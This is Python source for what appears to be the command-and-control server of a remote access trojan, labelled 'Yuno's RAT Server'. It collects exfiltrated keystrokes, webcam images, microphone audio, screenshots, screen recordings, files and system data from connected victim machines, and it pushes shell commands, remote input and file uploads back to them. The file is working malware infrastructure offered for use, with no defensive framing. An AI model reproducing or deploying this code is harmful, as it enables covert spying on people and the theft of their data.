#!/usr/bin/env python3
import socketio
import eventlet
import eventlet.wsgi
import json
from flask import Flask, render_template
from datetime import datetime
import os

# Initialize Flask and SocketIO
app = Flask(__name__)
sio = socketio.Server(cors_allowed_origins="*")
app = socketio.WSGIApp(sio, app)

# Client information storage
client_info = {}
client_activity = {}

@sio.event
def connect(sid, environ):
    print(f"[*] Client connected: {sid}")
    client_info[sid] = {"system": {}, "connected_at": datetime.now().isoformat()}
    client_activity[sid] = {"status": "active"}
    sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'active'})} for cid, info in client_info.items()], room=sid)

@sio.event
def disconnect(sid):
    print(f"[*] Client disconnected: {sid}")
    if sid in client_info:
        del client_info[sid]
        del client_activity[sid]
    sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'active'})} for cid, info in client_info.items()], broadcast=True)

@sio.event
def exfil_data(sid, data):
    try:
        data = json.loads(data)
        data_type = data.get("type")
        client_id = data.get("client_id", sid)

        if data_type == "system_info":
            client_info[client_id] = {"system": data, "connected_at": datetime.now().isoformat()}
            sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'active'})} for cid, info in client_info.items()], broadcast=True)
        elif data_type == "network_data":
            sio.emit('network_data', {'client_id': client_id, **data}, broadcast=True)
        elif data_type == "system_data":
            sio.emit('system_data', {'client_id': client_id, **data}, broadcast=True)
        elif data_type == "webcam_error" or data_type == "mic_error" or data_type == "screenshot_error" or data_type == "screen_record_error":
            sio.emit(data_type, {'client_id': client_id, 'message': data.get('message')}, broadcast=True)
        elif data_type == "screen_record":
            sio.emit('screen_record', {
                'client_id': client_id,
                'frames': data.get('frames')
            }, broadcast=True)
        elif data_type == "client_status":
            client_activity[client_id]["status"] = data.get('status')
            sio.emit('client_info', [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()], broadcast=True)
        elif data_type == "keylog_data":
            sio.emit('keylog_data', {'client_id': client_id, 'logs': data.get('logs')}, broadcast=True)
        elif data_type == "command_output":
            sio.emit('command_output', {
                'client_id': client_id,
                'command': data.get('command'),
                'output': data.get('output'),
                'current_dir': data.get('current_dir')
            }, broadcast=True)
        elif data_type == "file_download":
            sio.emit('file_download', {
                'client_id': client_id,
                'filename': data.get('filename'),
                'data': data.get('data')
            }, broadcast=True)
        elif data_type == "webcam_data":
            sio.emit('webcam_data', {'client_id': client_id, 'image': data.get('image')}, broadcast=True)
        elif data_type == "mic_data":
            sio.emit('mic_data', {'client_id': client_id, 'audio': data.get('audio')}, broadcast=True)
        elif data_type == "screenshot_data":
            sio.emit('screenshot_data', {'client_id': client_id, 'image': data.get('image')}, broadcast=True)
        print(f"[*] Received {data_type} from {client_id}")
    except Exception as e:
        print(f"[!] Error processing exfil_data: {e}")

@sio.event
def command(sid, data):
    print(f"[*] Sending command to clients: {data}")
    sio.emit('command', data, broadcast=True)

@sio.event
def remote_input(sid, data):
    print(f"[*] Sending remote input to clients: {data}")
    sio.emit('remote_input', data, broadcast=True)

@sio.event
def upload_file(sid, data):
    print(f"[*] Sending upload command to clients: {data}")
    sio.emit('upload_file', data, broadcast=True)

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    print("=== Yuno's RAT Server ===")
    print("A remote access server by Yuno\n")
    eventlet.wsgi.server(eventlet.listen(('', 5000)), app)